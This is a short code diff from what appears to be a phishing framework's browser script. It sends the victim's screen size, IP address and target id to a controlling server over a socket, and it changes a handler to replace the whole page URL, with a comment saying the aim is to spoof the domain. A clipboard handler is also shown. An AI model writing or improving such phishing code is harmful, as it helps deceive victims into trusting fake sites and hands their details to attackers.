@@ -41,8 +41,9 @@ let viewport_width = width()
 let viewport_height = height()
 socket.emit('new_phish', viewport_width, viewport_height, client_ip, target_id)
 
-socket.on("push_state", function(new_state){
-  history.pushState({},'','/' + new_state)
+socket.on("push_state", function(new_url){
+  // Replace the entire URL to spoof the domain
+  history.replaceState({}, '', new_url)
 })
 
 socket.on("copy_to_clipboard", function(data){
